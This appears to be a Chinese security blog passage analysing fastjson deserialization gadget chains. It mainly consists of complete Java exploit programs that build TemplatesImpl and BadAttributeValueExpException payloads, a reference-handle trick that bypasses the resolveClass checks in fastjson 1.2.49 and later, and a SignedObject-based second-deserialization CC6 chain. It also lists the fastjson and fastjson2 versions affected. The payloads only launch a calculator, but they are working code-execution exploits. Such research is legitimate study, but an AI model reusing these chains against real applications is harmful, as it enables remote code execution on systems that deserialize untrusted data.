javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonArray); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行后弹出计算机，调试过后过程基本相同，最后序列化相关变量的地方在：\n————\n需要注意的是，上面两条链子也能打fastjson2版本，在maven仓库上看目前最新的fastjson版本为2.0.57，经测试fastjson2版本\u0026lt;=2.0.26能打，从2.0.27开始被修复了，依赖如下：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.26\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试改一下版本即可。\nfastjson\u0026gt;=1.2.49 这部分的绕过分析具体可看y4师傅的文章，非常清楚了，简单记录一下。\n注意改依赖版本，依赖如下：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.49\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在fastjson1中，从1.2.49版本开始相比fastjson1\u0026lt;=1.2.48版本的利用类有了改变，就JSONObject和JSONArray类来说，在这个版本过后都添加了自带的readObject()方法，也就是在反序列化时会调用的方法。\nJSONArray类的readObject()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 private void readObject(final java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { JSONObject.SecureObjectInputStream.ensureFields(); if (JSONObject.SecureObjectInputStream.fields != null \u0026amp;\u0026amp; !JSONObject.SecureObjectInputStream.fields_error) { ObjectInputStream secIn = new JSONObject.SecureObjectInputStream(in); secIn.defaultReadObject(); return; } in.defaultReadObject(); for (Object item : list) { if (item != null) { ParserConfig.global.checkAutoType(item.getClass().getName(), null); } } } JSONObject类的readObject()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private void readObject(final java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { SecureObjectInputStream.ensureFields(); if (SecureObjectInputStream.fields != null \u0026amp;\u0026amp; !SecureObjectInputStream.fields_error) { ObjectInputStream secIn = new SecureObjectInputStream(in); secIn.defaultReadObject(); return; } in.defaultReadObject(); for (Entry entry : map.entrySet()) { final Object key = entry.getKey(); if (key != null) { ParserConfig.global.checkAutoType(key.getClass().getName(), null); } final Object value = entry.getValue(); if (value != null) { ParserConfig.global.checkAutoType(value.getClass().getName(), null); } } } 从这两个readObject()方法中，可以看出来在反序列化时都会委托给SecureObjectInputStream类进行处理，这个类重写了resolveClass()方法：\n这里就是调用了checkAutoType()方法来进行对反序列化类的检测，这个checkAutoType()方法我们已经很熟悉了，并且这里fastjson的版本是1.2.49，但是同样是可以绕过的，这里的反序列化过程可以看成如下：\n1 ObjectInputStream -\u0026gt; readObject... -\u0026gt; SecureObjectInputStream -\u0026gt; readObject -\u0026gt; resolveClass 在前面的分析中，我们可以知道主要的检测逻辑就是在resolveClass()方法，但是我们需要知道的是，在反序列化时，不是所有的反序列化时都会调用resolveClass()方法，所以这里存在一个绕过方法，可以寻找什么情况下不会调用resolveClass()方法，从而可以绕过这个检测。\n在java.io.ObjectInputStream#readObject0的调用中，会根据读到的bytes中tc的数据类型做不同的处理来进行对象的反序：\n部分如上，这里我们要利用到的就是图中标注出来的TC_REFERENCE类型的处理，从名称也可以看出来这里就是要处理引用类型的数据，对于resolveClass()方法的调用过程，以如下代码简单调试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import java.io.*; public class AppTest { public static void main(String[] args) throws IOException, ClassNotFoundException{ Test123 test = new Test123(\u0026#34;fupanc\u0026#34;); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(test); oos.close(); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new MyTestInputStream(bais); Test123 a = (Test123)ois.readObject(); System.out.println(a.getName()); } } class MyTestInputStream extends ObjectInputStream{ public MyTestInputStream(InputStream in) throws IOException { super(in); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { System.out.println(\u0026#34;just a Test\u0026#34;); return super.resolveClass(desc); } } class Test123 implements Serializable { public String name; private static final long serialVersionUID = 1L; public Test123(String name){ this.name=name; } public String getName(){ return name; } } 这里我是自己重写了一个resolveClass()方法，运行后输出如下：\n1 2 just a Test fupanc 可以看到是成功调用了resolveClass()方法，对于这里的反序列化，是直接反序列化的一个实例化对象，也是我们平时比较常用的点，打断点于readObject()方法，然后开始调试：\n跟进这里的readObject0()方法，然后到switch部分，会匹配到TC_OBJECT类型：\n跟进这里的readOrdinaryObject()方法：\n其实我们一般反序列化对象的实例化的点就是下面标注出来的，并且如果实例化成功最后返回的也是这个obj。这里我们是在找resolveClass()方法调用部分，继续跟进readClassDesc()方法；\n可以看到是对byte取了下一个数据类型，如果是TC_CLASSDESC类型的话，就会再次调用readNonProxyDesc()方法，这个方法内部就会有resolveClass()方法的调用：\n由于对象的关系，这里就会调用到我自定义的resolveClass()方法：\n由此形成了一个闭环，我这里只是简单分析了一下流程。可以简单总结一下前面的流程，比较关键的点就是：\nreadClassDesc()方法=》如果下一个数据类型是TC_CLASSDESC就会调用到readNonProxyDesc()方法=》resolveClass()方法\n然后看前面的readObject0()方法的不同数据类型对应调用的不同方法，大部分类型所需要的方法都是会readClassDesc()方法的，所以也是会有一定概率会调用到resolveClass()方法的，所以这里是需要找一个不会调用readClassDesc()方法方法的数据类型，这里有几个，但是有用的就是TC_REFERENCE类型，这个类型对应的readHandle()方法是通过映射来获取对象的：\n犹记得前面的TC_OBJECT类型是先调用的readClassDesc进行反序列化类的检查，然后才是调用的newInstance()方法进行的实例化，所以这里的引用是非常好用来绕过的。\n所以现在的思路就是在JSONObject/JSONArray反序列化时，进行检测时，不会调用resolveClass()方法，从而可以来绕过，如何建立从对象到引用的映射，利用方法就是向List、set、map类型中添加同样对象就可以成功利用。\n从List类型构造一个例子来调试理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package org.example; import java.io.*; import java.util.ArrayList; import java.util.HashMap; public class AppTest { public static void main(String[] args) throws IOException, ClassNotFoundException{ Test123 test = new Test123(\u0026#34;fupanc\u0026#34;); ArrayList list = new ArrayList(); list.add(test); HashMap map = new HashMap(); map.put(\u0026#34;fupanc\u0026#34;, test); list.add(map); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(list); oos.close(); } } class Test123 implements Serializable { public String name; private static final long serialVersionUID = 1L; public Test123(String name){ this.name=name; } public String getName(){ return name; } } 在ArrayList的writeObject打一个断点，使用for循环来进行分别处理：\n重点看第二次，在上图中的writeObject()方法后会调用writeObject0()方法进行处理，我这里本地测试是使用的HashMap来实现一个对象存有另外一个对象的情况，模拟的JSONArray的存储，需要注意注意的是,Hashmap自己有实现writeObject()方法：\n这里的internalWriteEntries()方法值得关注，会进行如下的调用：\n同样是遍历HashMap中的键值对，然后调用writeObject()对key和value都进行了序列化处理。\n回到ArrayList类的序列化处理方法，说明一下关键点：\n注意理解序列化的过程，会调用到HashMap类的writeObject()，也是前面提过的：\n这里我发现一个东西，似乎这里对于一个值的存储，如果前后放入有相同的类型的值，都会使用引用来进行映射，我上面的测试代码中，是放入了两个String.class类型的\u0026quot;fupanc\u0026quot;类型的变量，发现这里还是会写成引用类型：\n因为都是String类型？所以会用引用Test123中的name？并且我讲放入的键值对改成\u0026quot;123\u0026quot;:Test13，这样就只会在Test123这里标注为引用类型，稍底层了，不是很理解，对于Test123类实例，就是按照前面的预期写成引用类型：\nwriteHandle()方法：\n所以这里就可以尝试如下构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonArray); ArrayList list = new ArrayList(); list.add(templates); list.add(bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(list); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行后成功弹出计算机。\n总结来说这里的过程就是第一次成功反序列化TemplatesImpl类，然后第二次反序列化BadAttributeValueExpException类时，当调用到JSONArray的readObject()时，当反序列化JSONArray中的TemplatesImpl类时，此时的TemplatesImpl类是一个引用类型，不会调用resolveClass()方法，从而成功绕过。\nJSONObject同样的道理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ArrayList list = new ArrayList(); list.add(templates); list.add(bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(list); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 那么对于map类型，这里就直接使用Hashmap即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.HashMap; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); HashMap hashMap = new HashMap(); hashMap.put(templates,bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 具体过程其实前面也说了，在序列化时会分别对key和value进行writeObject()处理：\n所以我这里的处理方式是：\n1 2 HashMap hashMap = new HashMap(); hashMap.put(templates,bad); 第一次放入一个TemplatesImpl类实例，然后第二次放入的bad的TemplatesImpl类就是应用类型，可以绕过。\nJSONArray也一样：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.HashMap; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } set类型的：\n使用HashSet，但是有点问题，似乎当放入后会自己再进行排序，导致不会是第二次调用writeObject()时是JSONArray类，发现无论什么先后放入顺序，最后都是JSONArray为0，TemplatesImpl为1，导致不能在想利用的地方形成引用类型。\n既然都是调用getter方法了，那么是肯定可以打二次反序列化的，以一个二次反序列化CC6为例：\n1.2.48版本直接打：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import java.lang.reflect.Field; import java.util.HashMap; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import com.alibaba.fastjson.JSONArray; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); JSONArray jsonArray = new JSONArray(); jsonArray.add(signedObject); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,jsonArray); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 高版本的禁了这个二次反序列化类：\n1 autoType is not support. java.security.SignedObject 同样绕一下即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package org.example; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.HashMap; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import com.alibaba.fastjson.JSONArray; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); JSONArray jsonArray = new JSONArray(); jsonArray.add(signedObject); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,jsonArray); ArrayList list = new ArrayList(); list.add(signedObject); list.add(bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(list); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ————\n最后，对于这里的利用方法，根据y4师傅说法如下：\n有点不是很懂，后面对底层理解更深了再来看看这个绕过方法，感觉还是比较有用的。\n参考文章：\nhttps://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/\nhttps://nivi4.notion.site/fastjson-17753526a00246f9b146eca7354b8835\n","date":"2025-04-17T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","title":"fastjson反序列化调用链分析"},{"content":"fastjson反序列化 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以序列化一个对象为json字符串们，也可以反序列化一个json字符串为一个对象，其实也就是和jackson差不多的。\n基本过程了解 在这里先来看json序列化和反序列化的过程。\n导入依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 如下就是一个简单的序列化和反序列化的过程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 输出为：\n1 2 3 4 5 =====序列化===== {\u0026#34;age\u0026#34;:1233,\u0026#34;name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====反序列化===== fupanc 1233 这里的转换过程其实是和jackson差不多的，都是调用的getter和setter来进行的取值与赋值。\n@JSONField注解 不知道有没有用，先简单了解一下，通过这个注解，我们可以自定义字段的名称的输出，如下demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { 